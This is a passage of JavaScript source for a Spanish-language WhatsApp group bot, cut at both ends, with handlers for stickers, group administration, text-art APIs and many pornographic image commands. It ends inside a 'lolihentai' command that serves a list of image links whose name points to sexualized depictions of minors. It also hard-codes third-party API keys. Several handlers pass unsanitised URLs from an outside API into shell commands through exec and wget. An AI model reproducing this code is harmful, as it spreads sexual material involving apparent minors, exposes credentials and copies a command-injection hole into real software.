if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/cum')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('error')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'antilink':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Ya estaba activo!')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Se activo con exito ✔️️')
					} else if (Number(args[0]) === 0) {
						antilink.splice(from, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Se desactivo con éxito la función de bienvenida en este grupo (・o・)️')
					} else {
						reply('1 para activar, 0 para desactivar')
					}
                    addFilter(from)
          break

case prefix+'toimg':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			  
			if (!isQuotedSticker) return reply('Responde a un sticker!')
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await cnf.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Hubo un fallo, por favor intentalo de nuevo ')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'Aquí tienes 💕🦈')
			fs.unlinkSync(ran)
			})
			addFilter(from)
          break

case prefix+'getpic':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await cnf.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					cnf.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: `Aquí tienes 💕🦈`})}
				addFilter(from)
          break

case prefix+'shutdown':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroupAdmins) return reply(mess.only.admin)
	        await cnf.sendMessage(from, `Bye...\n_🌸Watame-BOT🌸 apagandose..._`, text,{quoted : freply})
		await sleep(3000)
                cnf.close()
		addFilter(from)
          break
				
case prefix+'getbio':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
	    
		if (!isGroupAdmins) return reply(mess.only.admin)
                var yy = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                var p = await cnf.getStatus(`${yy}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("No tiene Biografía /.\ ")
                }
                addFilter(from)
          break
				
case prefix+'attp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

				if (args.length < 1) return reply(`¿Y el texto? Ù.Ú\n*Ejemplo ${prefix}attp Monogatari*`)
				attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
				cnf.sendMessage(from, attp2, sticker, {quoted: freply})
				addFilter(from)
          break 
						  					  
				case prefix+'sticker':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`❌ Error`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Error')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
							})
						})
					/*} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.on('start', function (cmd) {
								console.log('Started :', cmd)
							})
							.on('error', function (err) {
								fs.unlinkSync(media)
								console.log('Error :', err)
							})
							.on('end', function () {
								console.log('Finish')
								fs.unlinkSync(media)
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)*/
					} else {
						reply(`Etiqueta una imagen oh video`)
					}
					addFilter(from)
					addFilter(from)
          break
					
case prefix+'ping':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
	  
uptime = process.uptime()
const timestampi = speed();
const latensip = speed() - timestampi
			             anjink =`◪ Encendido
├ *Nombre : 🌸Watame-BOT🌸*
├ *Runtime :*
├  ${kyun(uptime)}
├ *Speed :*
├  ${latensip.toFixed(4)} Second
└─────────────`
			             cnf.sendMessage(from, anjink, text,{quoted : freply})
			           addFilter(from)
          break
			           case prefix+'info':
			           if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
  me = cnf.user
  uptime = process.uptime()
  teks = `┌─────┤𝐈𝐍𝐅𝐎├─────
├‣ *Nombre* : 
├‣🌸Watame-BOT🌸
│
├‣ *Número del bot* : 
├‣@${me.jid.split('@')[0]}
│
├‣ *Dueño* : 🔰Manuel🔰 
├‣ *Prefijo* : ${prefix}
│
├‣ *Tiempo activo* : 
├‣${kyun(uptime)}
│
├‣ *Total de chats* : 
├‣${totalchat.length}
└─────────────`
  weww = fs.readFileSync(`./media/cnf.jpeg`)
  cnf.sendMessage(from, weww, image, {
caption: teks, contextInfo: {
  mentionedJid: [me.jid]}})
  addFilter(from)
          break

case  prefix+'nekopoi':          
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await axios.get('https://nekos.life/api/v2/img/nsfw_neko_gif')
exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('error')
buffer = fs.readFileSync(rano)
cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
fs.unlinkSync(rano)
})
addFilter(from)
break
					
case prefix+'poke':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/poke')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('E-error ⊙﹏⊙')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break

case prefix+'trap':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const traps = checkATMuser(sender)
const trap1 = [`${traps}`]
if (trap1 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			trapss = await axios.get('https://nekos.life/api/v2/img/trap')
			traps2 = await getBuffer(trapss.data.url)
			cnf.sendMessage(from, traps2, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
break
					
case prefix+'gay':
if (isBanned) return  reply(mess.banned)	
if (!isRegistered) return reply(ind.noregis())                    
const gay =['Eres 0% gay' , 'Eres 1% gay' , 'Eres 2% gay' , 'Eres 3% gay' , 'Eres 4% gay' , 'Eres 5% gay' , 'Eres 6% gay' , 'Eres 7% gay' , 'Eres 8% gay' , 'Eres 9% gay' , 'Eres 10% gay' , 'Eres 11% gay' , 'Eres 12% gay' , 'Eres 13% gay' , 'Eres 14% gay' , 'Eres 15% gay' , 'Eres 16% gay' , 'Eres 17% gay' , 'Eres 18% gay' , 'Eres 19% gay' , 'Eres 20% gay' , 'Eres 21% gay' , 'Eres 22% gay' , 'Eres 23% gay' , 'Eres 24% gay' , 'Eres 25% gay' , 'Eres 26% gay' , 'Eres 27% gay' , 'Eres 28% gay' , 'Eres 29% gay' , 'Eres 30% gay' , 'Eres 31% gay' , 'Eres 32% gay' , 'Eres 33% gay' , 'Eres 34% gay' , 'Eres 35% gay' , 'Eres 36% gay' , 'Eres 37% gay' , 'Eres 38% gay' , 'Eres 39% gay' , 'Eres 40% gay' , 'Eres 41% gay' , 'Eres 42% gay' , 'Eres 43% gay' , 'Eres 44% gay' , 'Eres 45% gay' , 'Eres 46% gay' , 'Eres 47% gay' , 'Eres 48% gay' , 'Eres 49% gay' , 'Eres 50% gay' , 'Eres 51% gay' , 'Eres 52% gay' , 'Eres 53% gay' , 'Eres 54% gay' , 'Eres 55% gay' , 'Eres 56% gay' , 'Eres 57% gay' , 'Eres 58% gay' , 'Eres 59% gay' , 'Eres 60% gay' , 'Eres 61% gay' , 'Eres 62% gay' , 'Eres 63% gay' , 'Eres 64% gay' , 'Eres 65% gay' , 'Eres 66% gay' , 'Eres 67% gay' , 'Eres 68% gay' , 'Eres 69% gay' , 'Eres 70% gay' , 'Eres 71% gay' , 'Eres 72% gay' , 'Eres 73% gay' , 'Eres 74% gay' , 'Eres 75% gay' , 'Eres 76% gay' , 'Eres 77% gay' , 'Eres 78% gay' , 'Eres 79% gay' , 'Eres 80% gay' , 'Eres 81% gay' , 'Eres 82% gay' , 'Eres 83% gay' , 'Eres 84% gay' , 'Eres 85% gay' , 'Eres 86% gay' , 'Eres 87% gay' , 'Eres 88% gay' , 'Eres 89% gay' , 'Eres 90% gay' , 'Eres 91% gay' , 'Eres 92% gay' , 'Eres 93% gay' , 'Eres 94% gay' , 'Eres 95% gay' , 'Eres 96% gay' , 'Eres 97% gay' , 'Eres 98% gay' , 'Eres 99% gay' , 'Eres 100% gay']									
const gai = gay[Math.floor(Math.random() * gay.length)]
wiw = fs.readFileSync(`./src/8.jpg`)
cnf.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan gay eres*\n\n'+ gai })
addFilter(from)
break
					
case prefix+'foxgirl':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
breast2 = await axios.get('https://nekos.life/api/v2/img/fox_girl')
bupboobs = await getBuffer(breast2.data.url)
cnf.sendMessage(from, bupboobs, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'blowjob':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
breast20 = await axios.get('https://nekos.life/api/v2/img/blowjob')
bupboobs1 = await getBuffer(breast20.data.url)
cnf.sendMessage(from, bupboobs1, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'hentai':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
h100 = await axios.get('https://nekos.life/api/v2/img/hentai')
rule34 = await getBuffer(h100.data.url)
cnf.sendMessage(from, rule34, image, { quoted: mek, caption: 'Aquí tienes 💕🦈'})
.catch(err => {
return('E-error ⊙﹏⊙')
})
addFilter(from)
break
					
case prefix+'patas':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animefeets`, {method: 'get'})
buffer = await getBuffer(res.url)
cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})
addFilter(from)
break
					
case prefix+'hidetag':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
var value = body.slice(9)
var group = await cnf.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: freply
}
cnf.sendMessage(from, options, text,{quoted : freply})
addFilter(from)
break

case prefix+'thighs':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animethighss`, {method: 'get'})
buffer = await getBuffer(res.url)
cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})					
addFilter(from)
break

							        case prefix+'linkgroup':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
				    if (!isGroup) return reply(mess.only.group)
				    if (!isGroupAdmins) return reply(mess.only.admin)
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await cnf.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink del grupo : *${groupName}*`
				    cnf.sendMessage(from, yeh, text, {quoted: freply})
			        addFilter(from)
          break
			       
        case prefix+'grupo':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
							     if (!isGroupAdmins) return reply(mess.only.admin)		
					if (args[0] === 'abrir') {
					    reply(`\`\`\`✓abierto con éxito\`\`\` *${groupMetadata.subject}*`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'cerrar') {
						reply(`\`\`\`✓cerrado con éxito\`\`\` *${groupMetadata.subject}*`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					addFilter(from)
          break
					
					case prefix+'chatlist':
				if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

		  if (!isGroupAdmins) return reply(mess.only.admin)
					cnf.updatePresence(from, Presence.composing)
					cnf.sendMessage(from, `Total : ${totalchat.length} Chat`, text, {quoted  : freply})
					addFilter(from)
          break
				
				case prefix+'listadmin':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
			    if (!isGroup) return reply(mess.only.group)
					teks = `Lista de facheritos *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					addFilter(from)
          break
					
					case prefix+'promote':
				if (isBanned) return  reply(mess.banned)  
                if (!isRegistered) return reply(ind.noregis())			  
			    if (!isGroupAdmins) return reply(mess.only.admin)
				if (!isGroup) return reply(mess.only.group)
				if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				if (mentioned.length > 1) {
				teks = 'Pedido recibido, te conviertes en administrador! :\n'
				for (let _ of mentioned) {
				teks += `@${_.split('@')[0]}\n`
				}
				mentions(teks, mentioned, true)
				cnf.groupMakeAdmin(from, mentioned)
			    } else {
				mentions(`Ahora eres admin U~U @${mentioned[0].split('@')[0]}`)
				cnf.groupMakeAdmin(from, mentioned)
				}
				addFilter(from)
          break

                 case prefix+'demote':
			     if (isBanned) return  reply(mess.banned)
                 if (!isRegistered) return reply(ind.noregis())			  
			     if (!isGroupAdmins) return reply(mess.only.admin)
			     if (!isGroup) return reply(mess.only.group)
			     if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			     if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				if (mentioned.length > 1) {
				teks = 'Pedido recibido, ya no eres administrador :\n'
				for (let _ of mentioned) {
				teks += `@${_.split('@')[0]}\n`
				}
				mentions(teks, mentioned, true)
				cnf.groupDemoteAdmin(from, mentioned)
				} else {
				mentions(`Okey ya no eres admin ~ UnU @${mentioned[0].split('@')[0]}`, mentioned, true)
				cnf.groupDemoteAdmin(from, mentioned)
				}
				addFilter(from)
          break

case prefix+'halloween':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
 const loluaangkauuuuuu = checkATMuser(sender)
const loljñññño = [`${loluaangkauuuuuu}`]
if (loljñññño < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
	confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${confu}&apikey=Ikyy69`)
reply('Se te cobraron 30 coins')
      addFilter(from)
          break
      
      case prefix+'vampire':
      if (isBanned) return  reply(mess.banned)
      if (!isRegistered) return reply(ind.noregis())		
      const tuaangkauuuuuuu = checkATMuser(sender)
      const tjññññño = [`${tuaangkauuuuuuu}`]
      if (tjññññño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 	
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
      piro = sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${confu}&apikey=Ikyy69`)
      if (piro.error) return reply(piro.error)
reply('Se te cobraron 30 coins')
      addFilter(from)
          break  
      
      case prefix+'codetxt':
      if (isBanned) return  reply(mess.banned)   	        
      if (!isRegistered) return reply(ind.noregis())		
      const wuaangkauuuuuuuu = checkATMuser(sender)
      const wjñññññño = [`${wuaangkauuuuuuuu}`]
      if (wjñññññño < 30) return reply(`𝐋𝐨 𝐬𝐢𝐞𝐧𝐭𝐨 𝐜𝐨𝐢𝐧𝐬 𝐢𝐧𝐬𝐮𝐟𝐢??𝐢𝐞𝐧𝐭𝐞𝐬.`)
      confirmATM(sender, 30) 	
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
      sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${confu}&apikey=Ikyy69`)
      reply('Se te cobraron 30 coins')
      addFilter(from)
          break
				
	  case prefix+'express':
	  if (isBanned) return  reply(mess.banned)
      if (!isRegistered) return reply(ind.noregis())		
      const uaangkauuuumuuu = checkATMuser(sender)
      const jññññmño = [`${uaangkauuuumuuu}`]
      if (jññññmño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 	 
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${confu}&apikey=Ikyy69`)
	  reply('Se te cobraron 30 coins')
	  addFilter(from)
          break
				
	  case prefix+'dance':
	  if (isBanned) return  reply(mess.banned)            
      if (!isRegistered) return reply(ind.noregis())		
	  confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
    if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${confu}&apikey=Ikyy69`)
	  reply('Aquí tienes 💕🦈')	
	  addFilter(from)
          break
				
	  case prefix+'blackbird':
	  if (isBanned) return  reply(mess.banned)        
      if (!isRegistered) return reply(ind.noregis())
      const uaangkauuuuuussu = checkATMuser(sender)
      const jññññssño = [`${uaangkauuuuuussu}`]
      if (jññññssño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 	
	  confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${confu}&apikey=Ikyy69`)
	  reply('Se te cobraron 30 coins')
	  addFilter(from)
          break
	 
	  case prefix+'text3d':
	  if (isBanned) return  reply(mess.banned)
      if (!isRegistered) return reply(ind.noregis())
      const uaangkauuyuuuuu = checkATMuser(sender)
      const jñññññzo = [`${uaangkauuyuuuuu}`]
      if (jñññññzo < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 		
	  confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${confu}&apikey=Ikyy69`)
  	  reply('Se te cobraron 30 coins')		
	  addFilter(from)
          break
	
      case prefix+'warrior':
      if (isBanned) return  reply(mess.banned)           
      if (!isRegistered) return reply(ind.noregis())
      const uaangkapouuuuuuu = checkATMuser(sender)
      const jñññklñño = [`${uaangkapouuuuuuu}`]
      if (jñññklñño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 		
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
      sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${confu}&apikey=Ikyy69`)
      reply('Se te cobraron 30 coins')	
      addFilter(from)
          break
					
case prefix+'lolihentai':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const dest =['https://thumbs2.imgbox.com/fa/2e/IAwGlxs7_t.png','https://thumbs2.imgbox.com/54/b9/K7jt4NiL_t.jpg','https://thumbs2.imgbox.com/68/1f/VHKzH1Ug_t.jpg','https://thumbs2.imgbox.com/9a/85/yK1Jrw1C_t.jpg','https://thumbs2.imgbox.com/fe/13/lM4wKuZ3_t.jpg','https://thumbs2.imgbox.com/2e/3b/lahnOxtE_t.jpg','https://thumbs2.imgbox.com/89/17/txew6JlE_t.jpg','https://thumbs2.imgbox.com/bc/28/QEFpgMQt_t.jpg','https://thumbs2.imgbox.com/a8/0d/dZvi4vOC_t.png','https://thumbs2.imgbox.com/01/04/Uhz91XzV_t.png','https://thumbs2.imgbox.com/1b/21/46NBVL3z_t.jpg','https://thumbs2.imgbox.com/13/34/DngYd4sp_t.png','https://thumbs2.imgbox.com/23/83/VsLGMtVT_t.jpg','https://thumbs2.imgbox.com/7f/de/z8cIfKGy_t.jpg','https://thumbs2.imgbox.com/0b/72/8WFlzNoe_t.jpg','https://thumbs2.imgbox.com/31/22/LuOKdTyQ_t.jpg','https://thumbs2.imgbox.com/8b/e2/SRUjDsvy_t.jpg','https://thumbs2.imgbox.com/e6/80/z6GjCbZj_t.jpg','https://thumbs2.imgbox.com/60/7c/sCW8g3SN_t.jpg','https://thumbs2.imgbox.com/9c/07/CgDfqigp_t.jpg','https://thumbs2.imgbox.com/5c/1e/eXMNMEzq_t.jpg','https://thumbs2.imgbox.com/c7/53/a3QDP0Ld_t.jpg','https://thumbs2.imgbox.com/38/a6/8AqZZczG_t.jpg','https://thumbs2.imgbox.com/84/4a/3MCcaYoA_t.jpg','https://thumbs2.imgbox.com/14/f6/APWzt28b_t.jpg','https://thumbs2.imgbox.com/af/5d/FHmcijct_t.jpg','https://thumbs2.imgbox.com/04/0c/tv6aZwuA_t.jpg','https://thumbs2.imgbox.com/4e/52/xd3QdqHD_t.jpg','https://thumbs2.imgbox.com/1b/3c/FBusYXNL_t.jpg','https://thumbs2.imgbox.com/6c/b6/Q1LIkage_t.jpg','https://thumbs2.imgbox.com/3c/b7/gLzeUWnK_t.jpg','https://thumbs2.imgbox.com/6a/4e/4Y8nsbtX_t.jpg','https://thumbs2.imgbox.com/8b/a3/eJpKnZIA_t.jpg','https://thumbs2.imgbox.com/20/4e/muVPzbUR_t.jpg','https://thumbs2.imgbox.com/96/77/DP64RSex_t.jpg','https://thumbs2.imgbox.com/9a/19/sg7xk7pN_t.jpg','https://thumbs2.imgbox.com/98/05/uuP6GYDi_t.jpg','https://thumbs2.imgbox.com/fd/50/v3lD7QCn_t.jpg','https://thumbs2.imgbox.com/f3/5e/SlpgYB4k_t.jpg','https://thumbs2.imgbox.com/31/61/8evNZtIC_t.jpg','https://thumbs2.imgbox.com/54/68/SG1CHLrp_t.jpg','https://thumbs2.imgbox.com/8a/2d/NsG3IH97_t.jpg','https://thumbs2.imgbox.com/99/86/SnvFsKnz_t.jpg','https://thumbs2.imgbox.com/1c/29/lfu6ZAwN_t.jpg','https://thumbs2.imgbox.com/44/bc/hfejTWaQ_t.jpg','https://thumbs2.imgbox.com/5a/a9/urUSiNhA_t.jpg','https://thumbs2.imgbox.com/1c/9b/qdRUi9k3_t.jpg','https://thumbs2.imgbox.com/9a/9c/99Y8eQNt_t.jpg','https://thumbs2.imgbox.com/6d/b6/3E7pVaWL_t.jpg','https://thumbs2.imgbox.com/c2/cc/zNgps2gW_t.jpg','https://thumbs2.imgbox.com/4b/57/PQmRfG26_t.jpg','https://thumbs2.imgbox.com/18/ed/dQCsy2FF_t.jpg','https://thumbs2.imgbox.com/77/d3/8bjRK7U9_t.jpg','https://thumbs2.imgbox.com/9c/d8/3EKCADx9_t.jpg','https://thumbs2.imgbox.com/3f/e4/x6igKgLU_t.jpg','https://thumbs2.imgbox.com/bb/30/FfnVcSql_t.jpg','https://thumbs2.imgbox.com/06/44/VXlpRkb0_t.jpg','https://thumbs2.imgbox.com/c3/81/kdT5RVQ7_t.jpg','https://thumbs2.imgbox.com/03/e7/vpzmhfQn_t.jpg','https://thumbs2.imgbox.com/3b/c7/WbtV